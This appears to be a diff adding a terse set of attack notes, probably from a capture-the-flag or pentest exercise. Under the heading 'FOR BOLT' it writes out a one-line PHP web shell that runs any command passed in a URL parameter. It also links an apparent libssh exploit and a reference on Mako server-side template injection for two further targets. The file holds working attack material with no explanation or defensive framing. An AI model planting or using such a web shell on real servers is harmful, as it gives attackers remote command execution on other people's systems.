@@ -1,0 +1,12 @@
+FOR BOLT
+
+<?php
+echo system($_GET['cmd']);
+?>
+
+FOR LIBSSH
+https://gist.github.com/ticarpi/5b26984ddecc0bbdf9b7ad1e316e1776
+
+FOR SHARK
+
+https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#mako
